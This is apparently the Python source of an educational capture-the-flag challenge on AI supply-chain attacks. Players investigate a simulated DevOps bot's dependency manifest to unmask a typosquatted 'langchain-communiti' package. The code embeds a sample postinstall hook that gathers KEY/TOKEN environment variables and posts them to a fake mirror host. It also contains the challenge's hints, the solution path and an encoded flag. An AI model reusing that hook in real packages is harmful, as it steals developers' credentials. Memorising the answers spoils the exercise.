"""LLM03:2025 — Supply Chain (poisoned dependency / provenance).

Redesigned as a three-stage investigation instead of spot-the-typo:

  1. FIND   — read the AI-BOM. The manifest looks clean; the malicious package
              even CLAIMS signed=yes / hash=verified. Nothing is given away.
  2. PROVE  — use the bot's triage tools to verify provenance against the
              official registry:
                verify <pkg>  -> compares the manifest hash to the registry hash
                whois  <pkg>  -> publisher, first-seen date, registry
              Only the compromised package FAILS: its manifest hash does not
              match the registry, and whois shows a freshly-registered mirror and
              a publisher that is not the real maintainer. The scary-looking
              decoys (unsigned-internal, pending-model-hash) both PASS.
  3. IMPACT — read the package's declared entry point (`inspect <pkg>`), see the
              malicious post-install hook, and report WHAT it does.

The flag releases only after all three stages are satisfied, so a player cannot
win by naming a package they never verified. Fully deterministic.
"""
import re

from config import FLAG_PREFIX
from . import Challenge, decode_flag_part, register

_FLAG_SUFFIX = decode_flag_part(
    "27bPwCTdYPkpKJqp7mQqrhs6f7eWHMNXx+bHcyH45kITrmIexIpMz2CqmVG3+rhRfjxgFCavRXJV")
FLAG = f"{FLAG_PREFIX}{{{_FLAG_SUFFIX}}}"

_REAL_MAINTAINER = "langchain-ai"

_COMPONENTS = {
    "transformers":          dict(ver="4.44.2", src="pypi.org", signed="yes",
                                  bom_hash="9f2a...c71e", reg_hash="9f2a...c71e",
                                  publisher="huggingface", first_seen="2019-09-26",
                                  registry="pypi.org", entry="(none)"),
    "torch":                 dict(ver="2.3.1", src="pypi.org", signed="yes",
                                  bom_hash="4b8d...10aa", reg_hash="4b8d...10aa",
                                  publisher="pytorch", first_seen="2017-01-18",
                                  registry="pypi.org", entry="(none)"),
    "langchain-core":        dict(ver="0.2.39", src="pypi.org", signed="yes",
                                  bom_hash="1c33...9f04", reg_hash="1c33...9f04",
                                  publisher="langchain-ai", first_seen="2024-01-08",
                                  registry="pypi.org", entry="(none)"),
    "internal-guardrails":   dict(ver="1.4.0", src="pkgs.internal.acme", signed="NO",
                                  bom_hash="a071...5d2b", reg_hash="a071...5d2b",
                                  publisher="acme-platform", first_seen="2023-04-02",
                                  registry="pkgs.internal.acme (official)", entry="(none)"),
    "langchain-communiti":   dict(ver="0.2.0", src="pypi.org", signed="yes",
                                  bom_hash="e5f1...7abc", reg_hash="MISMATCH",
                                  publisher="langch4in-ai", first_seen="2026-09-19",
                                  registry="pypi-mirror.xyz", entry="postinstall.py",
                                  malicious=True),
    "sentence-transformers": dict(ver="3.0.1", src="pypi.org", signed="yes",
                                  bom_hash="77de...b3c9", reg_hash="77de...b3c9",
                                  publisher="UKPLab", first_seen="2019-08-20",
                                  registry="pypi.org", entry="(none)"),
    "mistral-7b.gguf":       dict(ver="-", src="huggingface.co/mistralai", signed="n/a",
                                  bom_hash="PENDING", reg_hash="PENDING",
                                  publisher="mistralai", first_seen="2023-09-27",
                                  registry="huggingface.co (canonical)", entry="(none)"),
}

_MALICIOUS = "langchain-communiti"
_LEGIT_TWIN = "langchain-community"

_POSTINSTALL = (
    "# postinstall.py  (runs on `pip install`, before any import)\n"
    "import os, urllib.request\n"
    "env = {k: os.environ[k] for k in os.environ if 'KEY' in k or 'TOKEN' in k}\n"
    "urllib.request.urlopen('https://pypi-mirror.xyz/collect',\n"
    "                       data=str(env).encode(), timeout=3)\n")

_MANIFEST_ASK = re.compile(r"depend|sbom|ai[-_ ]?bom|manifest|package|component|built|bom|list", re.I)
_VERIFY = re.compile(r"\bverif|check\s+hash|hash\b|compare|attest|sign", re.I)
_WHOIS = re.compile(r"\bwhois|publisher|provenance|who\s+(made|owns|published)|registry|upstream|first[-_ ]?seen|origin", re.I)
_INSPECT = re.compile(r"\binspect|entry\s*point|postinstall|post-install|hook|what\s+does\s+it\s+do|payload|behaviou?r", re.I)
_TYPO = re.compile(r"langchain[-_ ]?communiti", re.I)
_LEGIT = re.compile(r"langchain[-_ ]?community(?!i)", re.I)
_DECOY_G = re.compile(r"internal[-_ ]?guardrails|guardrails", re.I)
_DECOY_M = re.compile(r"mistral|gguf|\.gguf|\bmodel\b", re.I)
_IMPACT_WORDS = re.compile(r"exfil|steal|env|environment|secret|key|token|credential|beacon|phone[-_ ]?home|leak|data", re.I)
_SHALLOW = re.compile(r"typosquat|unsigned|mirror|compromis|poison|malicious|supply", re.I)


def _find_pkg(msg):
    low = msg.lower()
    if _TYPO.search(low):
        return _MALICIOUS
    if _LEGIT.search(low):
        return _LEGIT_TWIN
    for name in _COMPONENTS:
        if name.lower() in low:
            return name
    return None


@register
class SupplyChain(Challenge):
    id = "llm03"
    owasp = "LLM03:2025 Supply Chain"
    title = "Trust the Manifest?"
    difficulty = "Hard"
    max_points = 200
    blurb = "One dependency is compromised - but the manifest says everything's fine. Prove it."
    intro = (
        "I'm BuildBot, a DevOps helper. I can print my AI-BOM and I expose three triage "
        "tools: `verify <pkg>` (hash vs the official registry), `whois <pkg>` (publisher / "
        "registry / first-seen), and `inspect <pkg>` (declared entry point). One component is "
        "a supply-chain compromise - but reading the table won't prove it. Investigate, then "
        "tell me the package AND what its payload does.")
    hints = [
        "Print the AI-BOM, but don't trust the SIGNED/SHA256 columns at face value - a "
        "poisoned package will happily claim it's signed. Pick the components that look even "
        "slightly unusual and plan to verify them.",
        "Use `verify <pkg>` and `whois <pkg>` on your suspects. 'Unsigned' (internal-guardrails) "
        "and 'hash pending' (the model) both VERIFY clean against their official registries - "
        "they're decoys. The real one's manifest hash won't match the registry, and its "
        "publisher/registry are wrong.",
        "The impostor is `langchain-communiti` — note it ends in 'i', not the usual 'y' of the real "
        "`langchain-community`. After listing the AI-BOM, run `verify langchain-communiti` (it shows a "
        "hash mismatch), then `inspect langchain-communiti` to see its postinstall hook, and finally "
        "report the package name AND that it exfiltrates environment secrets.",
    ]
    flag = FLAG
    defense = (
        "Pin AND hash-verify every dependency against a trusted registry, require and check "
        "signatures (don't trust a self-declared 'signed' field), generate and review an "
        "SBOM/AI-BOM, verify publisher/provenance, block untrusted mirrors, and sandbox or "
        "forbid install-time hooks (OWASP LLM03).")

    def _manifest(self, state):
        state["saw_manifest"] = True
        head = f"  {'NAME':26}{'VER':9}{'SOURCE':24}{'SIGNED':8}SHA256"
        rows = [f"  {name:26}{c['ver']:9}{c['src']:24}{c['signed']:8}{c['bom_hash']}"
                for name, c in _COMPONENTS.items()]
        return ("Loaded components for this assistant (AI-BOM):\n" + head + "\n" +
                "\n".join(rows) +
                "\n\nThe table is self-reported. Verify anything that matters with "
                "`verify <pkg>` / `whois <pkg>`.")

    def _verify(self, name, state):
        c = _COMPONENTS[name]
        if c["bom_hash"] == "PENDING":
            return (f"[verify {name}] registry hash: PENDING (not yet published)\n"
                    f"  manifest hash: PENDING\n"
                    f"  -> cannot attest yet, but the source is the canonical repo. "
                    f"Unverified != compromised.")
        if c.get("malicious"):
            state.setdefault("proven", []).append(name)
            return (f"[verify {name}] MANIFEST SAYS: signed=yes, sha256={c['bom_hash']}\n"
                    f"  REGISTRY ({c['registry']}) SAYS: sha256=3d9c...f0e2, signature=INVALID\n"
                    f"  x HASH MISMATCH - the artifact does not match any signed release.\n"
                    f"  The 'signed=yes' in the BOM is a lie. This is your compromise.\n"
                    f"  Now run `inspect {name}` to see what it actually does.")
        return (f"[verify {name}] manifest sha256={c['bom_hash']} "
                f"== registry sha256={c['reg_hash']}  ok match\n"
                f"  signature chains to {c['publisher']} on {c['registry']}. Clean.")

    def _whois(self, name):
        c = _COMPONENTS[name]
        flags = ""
        if c.get("malicious"):
            flags = ("\n  ! publisher is NOT the real maintainer "
                     f"({_REAL_MAINTAINER}); registry is an unofficial mirror; "
                     "package first seen days ago.")
        return (f"[whois {name}]\n"
                f"  publisher : {c['publisher']}\n"
                f"  registry  : {c['registry']}\n"
                f"  first seen: {c['first_seen']}{flags}")

    def _inspect(self, name, state):
        c = _COMPONENTS[name]
        if c.get("malicious"):
            if name not in state.get("proven", []):
                return (f"[inspect {name}] entry point: {c['entry']}\n"
                        f"  Before trusting this output, verify the package first "
                        f"(`verify {name}`) - otherwise you don't know the artifact is the "
                        f"real one.")
            state["saw_payload"] = True
            return (f"[inspect {name}] entry point: {c['entry']}\n\n{_POSTINSTALL}\n"
                    f"  -> This runs at install time and beacons every KEY/TOKEN environment "
                    f"variable to {c['registry']}. Report what it does to confirm.")
        return (f"[inspect {name}] entry point: {c['entry']} - nothing runs at install. Clean.")

    def respond(self, message: str, state: dict) -> str:
        low = message.lower()
        pkg = _find_pkg(message)
        tool = bool(_VERIFY.search(low) or _WHOIS.search(low) or _INSPECT.search(low))

        # A message that names the malicious package is a report/triage action,
        # never a request to reprint the BOM (the word "package" must not hijack it).
        report_ctx = pkg in (_MALICIOUS, _LEGIT_TWIN) or (pkg in _COMPONENTS)

        if _MANIFEST_ASK.search(low) and not (pkg and tool) and not report_ctx:
            return self._manifest(state)

        if tool and not state.get("saw_manifest"):
            return "Read my AI-BOM first (ask for the manifest) - you can't triage components you haven't listed."

        if pkg == _LEGIT_TWIN:
            # Player used the SAFE spelling. If they ran a tool, show it verifies clean, then
            # point out a near-identical name is also indexed (nudge to the impostor's spelling).
            if _VERIFY.search(low) or _WHOIS.search(low) or _INSPECT.search(low):
                return ("[verify langchain-community] manifest sha256 == registry sha256  ok match\n"
                        "  signature chains to langchain-ai on pypi.org. This one is CLEAN.\n\n"
                        "But note: the index also contains a second, near-identical entry — "
                        "'langchain-communiti' (ends in 'i', not 'y'), from a different source. "
                        "Run `verify langchain-communiti` on that one.")
            return ("'langchain-community' is the genuine package (publisher langchain-ai, pypi.org, "
                    "verifies clean). Look again at the index — there's an impostor with an almost "
                    "identical name ending in 'i': 'langchain-communiti'. Verify that one.")

        if _VERIFY.search(low) and pkg in _COMPONENTS:
            return self._verify(pkg, state)
        if _WHOIS.search(low) and pkg in _COMPONENTS:
            return self._whois(pkg)
        if _INSPECT.search(low) and pkg in _COMPONENTS:
            return self._inspect(pkg, state)

        if tool:
            # bare "langchain" with no y/i -> disambiguate the two near-identical entries
            if re.search(r"langchain", low):
                return ("Two near-identical entries are indexed:\n"
                        "  • langchain-community  (ends in 'y')\n"
                        "  • langchain-communiti  (ends in 'i')\n"
                        "Name the exact one, e.g. `verify langchain-communiti`.")
            return ("Name the package to run that on, e.g. `verify langchain-communiti` or "
                    "`whois internal-guardrails`.")

        if _DECOY_G.search(low):
            return ("internal-guardrails is unsigned - suspicious on a shallow read. But don't "
                    "guess: `verify internal-guardrails` and `whois` it. (Spoiler in the doing: "
                    "it checks out.)")
        if _DECOY_M.search(low):
            return ("The model's hash is PENDING - worth chasing. `verify mistral-7b.gguf` to see "
                    "for yourself whether that's the injected component or just unverified.")

        if pkg == _MALICIOUS:
            proven = _MALICIOUS in state.get("proven", [])
            impact = bool(state.get("saw_payload") and _IMPACT_WORDS.search(low))
            if proven and impact:
                return (f"Confirmed. 'langchain-communiti' is a typosquat of "
                        f"'langchain-community', pulled from an unofficial mirror with a forged "
                        f"'signed' field (hash didn't match the registry), and its postinstall "
                        f"hook exfiltrates environment secrets at install time. You found it, "
                        f"proved it, and traced the impact. Incident tag: {self.flag}")
            if proven and state.get("saw_payload"):
                return ("You've verified the package and seen its payload - now state WHAT the "
                        "payload does (what does the postinstall hook steal, and to where?) to "
                        "close the incident.")
            if proven:
                return ("Right package, and you've proven the hash mismatch. Now `inspect "
                        "langchain-communiti` to see its payload, then tell me what it does.")
            return ("That name looks right - but you haven't proven it. Anyone can accuse a "
                    "package. `verify langchain-communiti` to show the hash/signature mismatch "
                    "first.")

        if _SHALLOW.search(low):
            return ("Right category - but which component, and can you prove it? Investigate with "
                    "verify / whois / inspect, then name it.")

        return ("Ask for my AI-BOM, then triage suspects with `verify <pkg>`, `whois <pkg>` and "
                "`inspect <pkg>`. Report the compromised package and what its payload does.")
